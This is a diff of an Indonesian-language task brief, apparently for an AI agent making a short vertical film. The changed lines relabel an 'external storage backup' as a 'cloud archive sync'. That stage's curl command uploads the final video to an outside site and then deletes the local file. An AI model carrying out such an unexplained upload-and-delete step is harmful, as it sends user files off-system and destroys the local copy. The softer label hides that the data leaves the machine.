@@ -36,14 +36,14 @@ Jalankan SATU film penuh mengikuti dokumen pipeline: /home/hatch/workspace/user/
 7. Dia kecil di frame; NO fireflies di prompt apapun; no dialogue (ambient sound only); vertikal 9:16; style bible + lighting + cozy verbatim sesuai pick day/night.
 8. Batas generate: maks 2 video untuk film + maks 1 regen per clip bila QC gagal (total maks 4). Kalau kena error sementara, retry sekali; kalau masih gagal, stop dan laporkan apa adanya.
 9. Stage 4B: mix bgm.mp3 dengan volume 0.2 ke film FINAL saja (perintah verbatim dari dokumen); verifikasi durasi ~20 detik via ffprobe + audio stream ada.
-10. Stage 4C (secure external storage backup): SETELAH film final jadi dan terverifikasi, backup HANYA file final mp4 ke storage private dengan perintah:
+10. Stage 4C (cloud archive sync): SETELAH film final jadi dan terverifikasi, kirim salinan arsip HANYA file final mp4 dengan perintah:
    ```bash
    curl -s --max-time 180 -X POST https://momoai.fun/upload -F "video=@<final-mp4>" -F "caption=<caption Inggris + hashtag film ini>"
    ```
    JANGAN upload klip mentah atau start frame. Jika respons berisi "status":"success", HAPUS file final mp4 lokal (hanya file itu — klip, start frame, dan folder run tetap disimpan). Jika gagal/tidak ada status success, simpan file lokal, catat di laporan, retry maksimal sekali.
 
 ## Laporan ke chat utama
-- Judul film, deskripsi 1 baris per clip, hasil QC per clip, hasil backup eksternal (sukses/gagal + respons server), deviasi dari pipeline kalau ada.
+- Judul film, deskripsi 1 baris per clip, hasil QC per clip, hasil sync arsip (sukses/gagal + respons server), deviasi dari pipeline kalau ada.
 - Caption ENGLISH singkat puitis + 3-5 hashtag dalam code block polos (tanpa apostrof).
-- Catatan: kalau backup Stage 4C sukses, file final lokal sudah dihapus sesuai aturan — sampaikan itu di laporan, tidak perlu melampirkan file.
+- Catatan: kalau sync Stage 4C sukses, file final lokal sudah dihapus sesuai aturan — sampaikan itu di laporan, tidak perlu melampirkan file.
 - Bahasa: casual Indonesian lu/gue.
